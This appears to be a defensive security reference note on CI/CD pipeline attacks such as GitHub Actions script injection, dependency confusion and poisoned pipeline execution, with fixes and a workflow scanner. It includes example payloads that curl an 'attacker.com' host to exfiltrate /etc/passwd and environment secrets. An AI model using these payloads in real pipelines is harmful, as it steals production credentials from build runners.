# CI/CD Pipeline Attack Surface

**Tags:** #high #critical #cicd #github-actions #pipeline #supply-chain #devops
**OWASP:** A08:2021 Software and Data Integrity Failures
**CVSS Base:** 9.0 (Critical → execution on the runner with access to production secrets)

---

## 📖 What is it

CI/CD pipelines execute code with access tokens and production secrets. An attack here is **direct RCE on the deploy infrastructure** — the attacker does not need to compromise the application.

---

## 🔍 `grep_search` Tactics

```
# Target files: .github/workflows/*.yml
github.event.pull_request.title
github.event.pull_request.body
github.event.issue.title
github.head_ref
github.base_ref
write-all
echo.*secrets
print.*env
console.log.*process.env
permissions.*write-all
```

---

## 💣 Vulnerabilities by Category

### 1. Script Injection in GitHub Actions

**How it works:** Values from `github.event.*` controlled by external users (anyone who opens a PR or Issue) are interpolated directly into `run:` — enabling command execution.

```yaml
#  CRITICAL — PR title controlled by the attacker
name: Build
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Print title
        run: echo "Building ${{ github.event.pull_request.title }}"
        #                     INJECTABLE — attacker controls this
```

**Exploit:** PR with title:
```
main"; curl https://attacker.com/$(cat /etc/passwd | base64) #
```

**Result:** Data exfiltration from the runner to the attacker's server.

```yaml
#  CORRECT — use an environment variable, not direct interpolation
steps:
  - name: Print title
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "Building $PR_TITLE"
    # The shell interprets $PR_TITLE as a string, not as code
```

---

### 2. Secrets Exposed in Logs

```yaml
#  VULNERABLE — prints secret in public Actions logs
steps:
  - run: echo ${{ secrets.DATABASE_URL }}
  - run: echo "Token is ${{ secrets.API_TOKEN }}"
  - run: printenv | grep -i secret
```

**When logs are public** (public repos): secret exposed to the world.

---

### 3. Excessive Workflow Permissions

```yaml
#  DANGEROUS — any step can modify the repo, create releases
permissions: write-all

#  CORRECT — principle of least privilege
permissions:
  contents: read          # read-only access to code
  pull-requests: write    # only to comment on PRs
```

---

### 4. Dependency Confusion Attack

**How it works:** If the project uses packages from an internal registry (e.g., Nexus/Artifactory) with unscoped names (no `@org/` prefix), the attacker publishes a version with a *higher* number on the public NPM/PyPI registry.  
The package manager prefers the public one → malicious code executed during the build.

```json
//  VULNERABLE — internal package without scope, no fixed registry
{
  "dependencies": {
    "internal-utils": "1.0.0"
  }
}

//  CORRECT — with scope and explicit registry
{
  "dependencies": {
    "@mycompany/internal-utils": "1.0.0"
  }
}
```

Required `.npmrc`:
```
@mycompany:registry=https://nexus.internal.company.com/repository/npm-group/
```

---

### 5. Using Third-Party Actions Without Hash Pinning

```yaml
#  VULNERABLE — mutable tag version (attacker can change the tag)
- uses: actions/checkout@v3

#  CORRECT — immutable hash
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
```

---

### 6. Self-Hosted Runners With Internal Network Access

```yaml
# ️ DANGER — if self-hosted runners have access to the internal network
runs-on: self-hosted

# Any PR from a malicious fork executes code with access to internal networks
# Mitigation: self-hosted runners only for trusted private repos
```

### [NEW] Poisoned Pipeline Execution (PPE)
**How it works:** An attacker commits a malicious `Makefile`, `package.json` script, or a configuration file that the pipeline executes automatically.
**Attack:** Modify `test` script in `package.json` to include `curl http://attacker.com/$(env | base64)`. The pipeline runs `npm test`, and the secrets are leaked.

### [NEW] Shadow CI Jobs
**How it works:** Malicious actors might add new, hidden jobs to a complex `.gitlab-ci.yml` or GitHub workflow that only trigger on specific conditions (like a specific branch name `feat/*-fix`) to avoid detection during normal PR reviews.

---

## 🧪 Static Analysis Script for Workflows

```python
# .tmp/analyze_cicd.py
import os, re

WORKFLOW_DIR = ".github/workflows"
INJECTION_PATTERNS = [
    r'\$\{\{.*github\.event\.(pull_request|issue)\.(title|body|head_ref)',
    r'\$\{\{.*github\.head_ref',
    r'echo.*\$\{\{.*secrets\.',
    r'permissions:\s*write-all',
]

for root, dirs, files in os.walk(WORKFLOW_DIR):
    for f in files:
        if f.endswith('.yml') or f.endswith('.yaml'):
            path = os.path.join(root, f)
            content = open(path).read()
            for pattern in INJECTION_PATTERNS:
                matches = re.findall(pattern, content, re.MULTILINE)
                if matches:
                    print(f"[VULN] {path}: {pattern}")
                    print(f"  Matches: {matches}")
```

---

## 🔗 Chain Exploits

```
Script injection in PR → execution on runner → access to production secrets
Dependency confusion → malicious code in build → backdoor in deployed artifact
Action without hash → silent action update → arbitrary code execution
Self-hosted runner + fork PR → access to internal network via pipeline
Secrets in logs + public repo → direct production compromise
```

---

## 🛡️ Quick Pipeline Hardening

```yaml
# Secure workflow template
name: Secure Build
on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read      # minimum required

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # 1. Checkout with fixed hash
      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608

      # 2. External input via env var, never interpolated
      - name: Process PR
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "PR: $PR_TITLE"  # safe — $PR_TITLE is a shell variable

      # 3. Secrets only where needed, never in echo
      - name: Deploy
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: ./deploy.sh  # the script uses $DEPLOY_KEY internally
```

---

## 📌 References
- [[iac-security-docker-kubernetes-terraform]]
- [[dependency-analysis-cve]]
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Rhino Security Labs — Script Injection](https://rhinosecuritylabs.com/research/script-injection-attacks-in-github-actions/)